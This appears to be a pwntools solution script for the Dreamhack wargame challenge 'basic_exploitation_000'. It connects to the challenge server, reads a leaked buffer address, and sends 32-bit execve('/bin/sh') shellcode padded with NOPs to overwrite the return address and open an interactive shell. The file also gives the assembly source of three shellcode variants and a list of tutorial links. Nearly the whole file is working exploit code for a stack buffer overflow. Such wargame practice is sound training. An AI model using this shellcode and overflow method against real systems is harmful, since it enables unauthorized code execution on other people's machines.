from pwn import *

context.log_level = "DEBUG"
context.arch = "i386"

p = remote("host3.dreamhack.games", 20666)
# p = process("../basic_exploitation_000")

p.recvuntil("buf = (")
buf_address = int(p.recv(10), 16)

# payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x08\xfe\xc0\xfe\xc0\xfe\xc0\xcd\x80"
payload = b"\x6a\x00\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x53\x31\xc9\x31\xd2\xb0\x06\x04\x05\xcd\x80"
# payload = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x05\x04\x06\xcd\x80"

payload += b'\x90'*(0x80-len(payload))
payload += b'\x90'*0x4
payload += p32(buf_address)

p.send(payload)
p.interactive()


""" payloads 

section .text
global _start
_start:
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6E69622f
	mov ebx, esp
	push eax
	push ebx
	mov ecx, esp
	mov edx, eax
	mov al, 0x8
	inc al
	inc al
	inc al
	int 0x80



section .text
global _start
_start:
	push 0x00 			; push null
	push 0x0068732f		; null llehs/
	push 0x6e69622f		; nib/
	mov ebx, esp		; argv0 (move stack pointer to ebx register)
	push ebx			; argv0
	xor ecx, ecx		; argv1 (NULL)
	xor edx, edx		; argv2 (NULL)
	mov al, 0x6  		; request syscall execve vector 6
	add al, 0x5			; al + 5 = 11 = execve
	int 0x80 			; syscall



section .text
global _start
_start:
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp
	xor ecx, ecx
	xor edx, edx
	mov al, 0x5
	add al, 0x6
	int 0x80
"""

""" comment
https://hdacker.tistory.com/20
https://www.proggen.org/doku.php?id=security:memory-corruption:exploitation:basic
https://www.hoony.lol/wargame/basic_exploitation_000
https://learn.dreamhack.io/2#16
"""